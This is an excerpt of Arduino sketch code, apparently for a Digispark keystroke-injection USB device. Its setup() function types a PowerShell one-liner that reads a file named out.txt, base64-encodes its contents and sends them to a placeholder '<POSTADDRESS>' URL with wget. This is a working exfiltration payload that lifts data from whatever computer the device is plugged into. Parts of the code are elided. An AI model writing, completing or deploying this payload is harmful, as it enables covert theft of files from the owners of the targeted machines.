...
void setup() {
  ...
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  printText(F("$inputfile = 'out.txt'; $fc = get-content $inputfile; $By = [System.Text.Encoding]::UTF8.GetBytes($fc); $etext = [System.Convert]::ToBase64String($By); wget <POSTADDRESS>?$etext"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
